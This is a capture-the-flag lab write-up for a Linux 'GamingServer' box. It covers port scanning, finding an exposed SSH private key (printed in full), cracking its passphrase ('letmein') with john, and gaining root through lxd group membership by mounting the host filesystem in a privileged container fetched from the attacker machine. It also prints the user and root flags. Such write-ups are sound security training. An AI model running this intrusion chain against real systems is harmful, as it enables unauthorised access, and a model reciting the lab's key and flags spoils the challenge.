# GamingServer Writeup

> Machine : Linux

> Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.130.177.134 -p-
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From our result, we can see two ports are open 22 (SSH) and 80 (HTTP).

So first let's start by visiting the web and see. viewing the source code we found:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

That's mean there is a user named `john`.

Then using `gobuster` to enumerate the directories on the web server.

```shell
gobuster dir -u 10.130.177.134 -w /usr/share/wordlists/dirb/common.txt
```

```text
secret               (Status: 301) [Size: 317] [--> http://10.130.177.134/secret/]
```

There is a secret directory which is interesting to see. entering the URL we found a `id_rsa` that help us enter with `ssh`.

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

```shell
wget "http://10.130.177.134/secret/secretKey"
```

```shell
chmod 600 secretKey
```

But he is secured with a passphrase, so we have to crack it using `john`.

```shell
ssh2john secretKey > secretKey.hash
```

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt secretKey.hash
```

```text
letmein          (secretKey)
```

And we found it. Now we can enter successfully.

```shell
ssh john@10.130.177.134 -i secretKey
letmein
```

And we are in.

```shell
cat user.txt
```

```text
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e 
```

> What is the user flag?
> 
> a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e 

Now we have to find a way to be root.

After checking the user privileges with `id` we found something interesting.

```shell
id
```

```text
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

The `lxd` group in Linux is a special system group that grants full, root-equivalent control over the local LXD container and virtual machine daemon.
Because the LXD daemon runs as root, any user in this group can instruct the daemon to build a highly privileged container, mount the host's entire filesystem `/` inside it, and access all host files with full root privileges.

First prepare the image (on your attacker machine).

```shell
sudo apt install distrobuilder
```

```shell
git clone https://github.com/saghul/lxd-alpine-builder
```

```shell
cd lxd-alpine-builder
sudo ./build-alpine
```

Second transfer and import the image on the target machine.

```shell
# Open a Python server on your attacker machine in the same directory
python -m http.server 8000
```

```shell
# In the target machine
wget "http://192.168.133.12:8000/alpine-v3.24-x86_64-20260915_2234.tar.gz"
```

Then import the downloaded image.

```shell
lxc image import ./alpine-v3.24-x86_64-20260915_2234.tar.gz --alias alpine-image
```

Third initialize and configure the container.

```shell
lxc init alpine-image privesc-container -c security.privileged=true
```

```shell
lxc config device add privesc-container host-root-disk disk source=/ path=/mnt/root recursive=true
```

Finally execute the shell and collect root access

```shell
lxc start privesc-container
lxc exec privesc-container /bin/sh
```

That's it now we have the root access.

```shell
find / -type f -name root.txt
```

```text
/mnt/root/root/root.txt
```

```shell
cat /mnt/root/root/root.txt
```

```text
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

> What is the root flag?
> 
> 2e337b8c9f3aff0c2b3e8d4e6a7c88fc

